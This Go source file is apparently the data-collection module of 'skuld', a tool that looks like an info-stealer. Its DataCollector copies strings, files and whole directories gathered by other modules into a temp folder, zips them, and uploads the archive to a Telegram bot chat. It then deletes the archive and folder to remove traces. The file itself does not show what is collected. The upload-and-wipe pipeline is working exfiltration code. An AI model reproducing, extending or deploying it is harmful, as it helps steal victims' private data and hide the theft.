package collector

import (
	"fmt"
	"os"
	"path/filepath"
	"sync"

	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/telegram"
)

type DataCollector struct {
	TempDir     string
	TelegramBot *telegram.TelegramBot
	mutex       sync.Mutex
}

func NewDataCollector(botToken, chatID string) *DataCollector {
	tempDir := filepath.Join(os.TempDir(), "skuld-collected-data")
	os.MkdirAll(tempDir, os.ModePerm)

	return &DataCollector{
		TempDir:     tempDir,
		TelegramBot: telegram.NewTelegramBot(botToken, chatID),
	}
}

func (dc *DataCollector) AddData(moduleName string, data interface{}) {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	moduleDir := filepath.Join(dc.TempDir, moduleName)
	os.MkdirAll(moduleDir, os.ModePerm)

	// Handle different data types
	switch v := data.(type) {
	case string:
		// If it's a string, treat it as file content
		filePath := filepath.Join(moduleDir, "data.txt")
		fileutil.AppendFile(filePath, v)
	case map[string]interface{}:
		// If it's structured data, save as text
		filePath := filepath.Join(moduleDir, "info.txt")
		for key, value := range v {
			fileutil.AppendFile(filePath, fmt.Sprintf("%s: %v", key, value))
		}
	}
}

func (dc *DataCollector) AddFile(moduleName, sourceFile, destName string) error {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	moduleDir := filepath.Join(dc.TempDir, moduleName)
	os.MkdirAll(moduleDir, os.ModePerm)

	destPath := filepath.Join(moduleDir, destName)
	return fileutil.CopyFile(sourceFile, destPath)
}

func (dc *DataCollector) AddDirectory(moduleName, sourceDir, destName string) error {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	moduleDir := filepath.Join(dc.TempDir, moduleName)
	os.MkdirAll(moduleDir, os.ModePerm)

	destPath := filepath.Join(moduleDir, destName)
	return fileutil.CopyDir(sourceDir, destPath)
}

func (dc *DataCollector) SendCollectedData() error {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	// Create final archive
	archivePath := filepath.Join(os.TempDir(), "skuld-data.zip")
	
	if err := fileutil.Zip(dc.TempDir, archivePath); err != nil {
		return fmt.Errorf("failed to create archive: %v", err)
	}

	// Get file size for caption
	fileInfo, _ := os.Stat(archivePath)
	fileSizeMB := float64(fileInfo.Size()) / (1024 * 1024)

	// Send archive via Telegram
	caption := fmt.Sprintf("🔍 Skuld Data Collection Complete\n📦 Archive Size: %.2f MB\n🎯 All modules executed successfully", fileSizeMB)
	if err := dc.TelegramBot.SendDocument(archivePath, caption); err != nil {
		// Clean up and return error
		os.Remove(archivePath)
		return fmt.Errorf("failed to send data via Telegram: %v", err)
	}

	// Clean up
	os.Remove(archivePath)
	os.RemoveAll(dc.TempDir)

	return nil
}

func (dc *DataCollector) SendMessage(message string) error {
	return dc.TelegramBot.SendMessage(message)
}

func (dc *DataCollector) Cleanup() {
	os.RemoveAll(dc.TempDir)
}